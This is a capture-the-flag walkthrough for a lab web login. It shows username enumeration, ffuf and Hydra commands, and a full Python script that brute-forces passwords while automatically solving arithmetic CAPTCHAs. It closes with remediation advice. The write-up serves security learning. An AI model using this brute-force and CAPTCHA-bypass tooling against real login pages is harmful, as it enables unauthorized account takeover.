## Capture

Medium-difficulty web-based machine. A login page is vulnerable to username enumeration. Coupled with a wordlist, credential brute forcing reveals valid usernames and passwords. The login form includes a CAPTCHA that requires solving arithmetic before each attempt. A custom Python script automates the entire process: detecting non-existent usernames, solving CAPTCHAs, and identifying successful logins.

**Target:** http://10.49.182.219
**Difficulty:** Medium
**Attack Path:** Reconnaissance → Username enumeration → Wordlist acquisition → Brute force with CAPTCHA solving → Valid credentials

---

### PART 1: RECONNAISSANCE

**Initial observation**

Visit the target URL:

```
http://10.49.182.219
```

A login page is displayed. Attempting a test login with `admin:password` returns a message: "Invalid credentials" or "username does not exist." This distinction is the start of username enumeration.

**Why this matters:** If the application returns different responses for "user not found" vs. "wrong password," an attacker can enumerate which usernames exist without knowing their passwords.

---

### PART 2: USERNAME ENUMERATION

**Manual testing**

```
admin:password  → "admin does not exist"
test:anything   → "test does not exist"
```

Each non-existent username triggers a specific message. An actual username would not return this message; instead, the application would reject the password.

**Automated enumeration with ffuf**

Using ffuf to test many usernames against a placeholder password reveals which accounts exist:

```bash
ffuf -w usernames.txt -d "username=FUZZ&password=test" \
  -u http://10.49.182.219/login \
  -fs <false-positive-size>
```

The `-fs` flag filters out responses of a certain size, reducing false positives from the "does not exist" message.

**Result:** One or more valid usernames are identified (for example, `natalie`).

---

### PART 3: WORDLISTS AND CREDENTIAL BRUTE FORCE

**Wordlist acquisition**

The challenge provides or references a zip file containing username and password lists. These lists are used for brute forcing.

**Simple Hydra attempt**

```bash
hydra -L users.txt -P pass.txt \
  10.49.182.219 http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid credentials"
```

**Problem:** This approach would work on a simple login. However, the target includes a CAPTCHA, which disrupts automated tools like Hydra. Each failed login attempt triggers a CAPTCHA challenge that must be solved before the next attempt.

**Result:** Hydra produces false positives or stops working mid-scan. A custom script is needed.

---

### PART 4: THE CAPTCHA CHALLENGE

**What the CAPTCHA looks like**

After a failed login, the response includes an arithmetic question:

```
What is 5 + 3?
```

Or with symbols:

```
5 + 3
```

**Why it exists:** Rate limiting and bot detection. Standard brute force tools cannot solve it automatically.

**Overcoming it:** The script parses the CAPTCHA question using regex, calculates the answer, and resubmits the form with the captcha field populated.

---

### PART 5: CUSTOM BRUTE FORCE SCRIPT

The custom script automates the entire process:

1. **Read wordlists:** Load usernames and passwords from files.
2. **Test each pair:** Submit username and password.
3. **Detect non-existent users:** Skip them and move to the next username.
4. **Detect CAPTCHA:** Parse the arithmetic question from the response.
5. **Solve CAPTCHA:** Calculate the result and resubmit.
6. **Identify success:** Check for a specific success indicator in the response.

**Complete script:**

```python
import re
import requests

usernames_file = "usernames.txt"
passwords_file = "passwords.txt"

url = "http://10.49.182.219/login"

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://10.49.182.219",
    "Connection": "close",
    "Referer": "http://10.49.182.219/login",
    "Upgrade-Insecure-Requests": "1",
}

def calculate(num1, num2, operation):
    """Solve arithmetic CAPTCHA."""
    if operation == '*':
        return num1 * num2
    elif operation == '+':
        return num1 + num2
    elif operation == '-':
        return num1 - num2
    elif operation == '/':
        return int(num1 / num2)
    else:
        raise ValueError(f"Invalid operation: {operation}")

def user_does_not_exist(response_text):
    """Check if the response indicates the user does not exist."""
    return "does not exist" in response_text.lower()

def captcha_detected(response_text):
    """Check if a CAPTCHA is present in the response."""
    return "captcha" in response_text.lower() or re.search(r"(\d+)\s*([\+\-\*/])\s*(\d+)", response_text)

# Load wordlists
with open(usernames_file, "r") as uf, open(passwords_file, "r") as pf:
    usernames = uf.read().splitlines()
    passwords = pf.read().splitlines()

# Brute force loop
for username in usernames:
    for password in passwords:
        data = {
            "username": username,
            "password": password,
        }
        
        # First attempt
        response = requests.post(url, headers=headers, data=data)
        response_size = len(response.content)
        
        # Skip username if it does not exist
        if user_does_not_exist(response.text):
            print(f"[SKIP] Username {username} does not exist.")
            break
        
        # Check for success (modify this condition based on the actual success response)
        if "does not exist" not in response.text.lower() and "captcha" not in response.text.lower():
            print(f"[SUCCESS] {username}:{password} (response size: {response_size})")
            exit(0)
        
        # Handle CAPTCHA
        if captcha_detected(response.text):
            captcha_match = re.search(r"(\d+)\s*([\+\-\*/])\s*(\d+)", response.text)
            if captcha_match:
                num1 = int(captcha_match.group(1))
                operation = captcha_match.group(2)
                num2 = int(captcha_match.group(3))
                
                # Calculate CAPTCHA answer
                captcha_answer = calculate(num1, num2, operation)
                print(f"[CAPTCHA] {num1} {operation} {num2} = {captcha_answer}")
                
                # Resubmit with CAPTCHA answer
                data["captcha"] = captcha_answer
                response = requests.post(url, headers=headers, data=data)
                response_size = len(response.content)
                
                # Check again for success after CAPTCHA
                if user_does_not_exist(response.text):
                    print(f"[SKIP] Username {username} does not exist.")
                    break
                
                if "does not exist" not in response.text.lower() and "captcha" not in response.text.lower():
                    print(f"[SUCCESS] {username}:{password} (response size: {response_size})")
                    exit(0)
                else:
                    print(f"[FAIL] {username}:{password} (response size: {response_size})")
            else:
                print(f"[FAIL] {username}:{password} (could not parse CAPTCHA)")
        else:
            print(f"[FAIL] {username}:{password} (response size: {response_size})")

print("[COMPLETE] Failed to find valid credentials with the given wordlists.")
```

**How the script works:**

1. **POST request:** Sends username and password to `/login`.
2. **Response parsing:** Uses regex to extract the CAPTCHA question.
3. **CAPTCHA solving:** The `calculate()` function handles `+`, `-`, `*`, and `/`.
4. **Re-submission:** Includes the `captcha` field in the next request.
5. **Success detection:** Checks for the absence of "does not exist" and "captcha" in the response.

**Before running:**
- Update `usernames_file` and `passwords_file` to point to your wordlists.
- Change the `url` to the target URL.
- Verify the success condition: the check `"does not exist" not in response.text.lower() and "captcha" not in response.text.lower()` assumes success means neither message is present. Test and adjust based on the actual response.

---

### PART 6: RUNNING THE SCRIPT

**Prepare wordlists**

Place `usernames.txt` and `passwords.txt` in the same directory as the script.

**Execute**

```bash
python3 brute_force.py
```

**Expected output:**

```
[CAPTCHA] 5 + 3 = 8
[FAIL] natalie:password1 (response size: 2543)
[CAPTCHA] 7 - 2 = 5
[SUCCESS] natalie:moonlight (response size: 4127)
```

---

### PART 7: SUCCESSFUL CREDENTIALS

**Result:**

```
Username: natalie
Password: moonlight
```

(These are examples; your script output will show the actual valid pair.)

With these credentials, log in to the application:

```
http://10.49.182.219/login
username: natalie
password: moonlight
```

---

### KEY CONCEPTS

**Username Enumeration:** Different error messages for "user not found" vs. "wrong password" leak information about which usernames exist.

**CAPTCHA Solving:** Regular expressions extract numeric CAPTCHA questions, and simple arithmetic functions solve them. This automation bypasses the intended rate limiting.

**Credential Brute Force:** Wordlists and automated scripts combine enumeration and password guessing. The success of this attack depends on:
- Weak or common passwords in the wordlist
- The size of the password list
- Rate limiting (or lack thereof) on the server

---

### SCRIPT PARAMETERS TO VERIFY

Before publishing, confirm:
- **URL:** Change `http://10.49.182.219/login` to the correct endpoint.
- **Form field names:** If the form uses different field names (e.g., `email` instead of `username`), update the `data` dictionary.
- **Success condition:** The script checks for the absence of "does not exist" and "captcha". Your server may use different text. Test with a known valid pair and adjust the condition.
- **CAPTCHA format:** The regex pattern `(\d+)\s*([\+\-\*/])\s*(\d+)` matches numbers, spaces, and operators. If the CAPTCHA is formatted differently, adjust the pattern.

---

### NOTES ON THE WORDLISTS

The challenge provides or references wordlists. The effectiveness of brute forcing depends on:
- How comprehensive the lists are
- Whether the target password is actually in the list
- How many pairs must be tested before a match

For this machine, the provided lists should contain the valid pair.

---

### REMEDIATION

```
├─ Do not leak whether a username exists; return the same message for both "user not found" and "wrong password"
├─ Implement rate limiting: limit failed attempts per user or IP
├─ Use a strong, cryptographically proper CAPTCHA (not simple arithmetic)
├─ Enforce strong passwords and educate users not to use common words
├─ Monitor for brute force attacks: log and alert on repeated failed attempts
└─ Consider multi-factor authentication to add a second verification step
```

---

### TECHNICAL NOTES

**Tools Used:**
- Manual testing (login attempts)
- ffuf (username enumeration)
- Python 3 with requests library (custom brute force)
- Regular expressions (CAPTCHA parsing)

**Key Insight:** The combination of username enumeration, CAPTCHA solving, and parallel password testing defeated the login mechanism. A custom script was needed because standard tools cannot handle the CAPTCHA layer.

**Concepts to Study:**
- Information leakage in error messages
- CAPTCHA as a rate-limiting mechanism
- Automation of web login attacks
- Wordlist-based brute forcing

# Jai Shri Ram
